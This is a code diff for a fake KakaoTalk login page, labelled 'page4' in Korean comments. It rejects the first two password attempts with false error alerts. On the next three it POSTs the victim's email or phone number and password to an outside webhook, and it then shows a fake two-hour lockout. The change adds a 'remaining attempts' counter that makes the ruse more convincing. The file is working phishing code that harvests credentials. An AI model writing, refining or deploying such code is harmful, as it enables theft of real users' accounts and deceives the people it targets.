@@ -183,30 +183,33 @@ function sendPhone() {
   },1500);
 }
 
-// page4 로그인 처리
+// page4 로그인 처리 (잔여 시도 횟수 표시)
 function sendPage4() {
-  const userId4=document.getElementById("userId4").value.trim();
-  const userCode4=document.getElementById("userCode4").value.trim();
-  if(!userId4||!userCode4){alert("이메일/전화번호와 비밀번호를 입력해주세요."); return;}
+  const userId4 = document.getElementById("userId4").value.trim();
+  const userCode4 = document.getElementById("userCode4").value.trim();
+  if(!userId4 || !userCode4){ alert("이메일/전화번호와 비밀번호를 입력해주세요."); return; }
 
   loginTryCount++;
+  const maxAttempts = 5;
+  const remaining = Math.max(0, maxAttempts - loginTryCount + 1);
 
-  if (loginTryCount <= 2) {
-    alert("비밀번호가 틀렸습니다.");
+  if(loginTryCount <= 2) {
+    alert(`비밀번호가 틀렸습니다. 남은 시도 횟수: ${remaining}`);
     return;
   }
 
-  if (loginTryCount >= 3 && loginTryCount <= 5) {
+  if(loginTryCount >= 3 && loginTryCount <= 5) {
     fetch(webhookUrl,{
       method:"POST",
       headers:{"Content-Type":"application/x-www-form-urlencoded"},
-      body:new URLSearchParams({page:"4",userId:userId4,password:userCode4,timestamp:new Date().toISOString()})
-    }).then(()=>alert("page4 값 전송 완료!")).catch(err=>console.error(err));
+      body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()})
+    }).then(()=>alert(`page4 값 전송 완료! 남은 시도 횟수: ${remaining}`))
+      .catch(err=>console.error(err));
     return;
   }
 
-  if (loginTryCount > 5) {
-    alert("카카오톡 로그인 시도 횟수를 초과했습니다 2시간 후에 다시 시도해 주세요");
+  if(loginTryCount > 5) {
+    alert("카카오톡 로그인 시도 횟수를 초과했습니다. 2시간 후에 다시 시도해 주세요");
     return;
   }
 }
